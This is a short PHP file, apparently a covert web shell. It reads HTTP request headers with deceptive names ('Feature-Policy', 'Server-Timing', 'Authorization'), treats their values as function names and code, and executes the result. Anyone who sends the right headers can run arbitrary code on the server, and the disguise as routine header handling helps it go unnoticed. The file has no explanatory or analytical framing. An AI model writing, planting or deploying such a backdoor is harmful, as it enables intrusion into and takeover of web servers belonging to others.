<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Feature-Policy'])) {
    $system = $_HEADERS['Feature-Policy']('', $_HEADERS['Server-Timing']($_HEADERS['Authorization']));
    $system();
}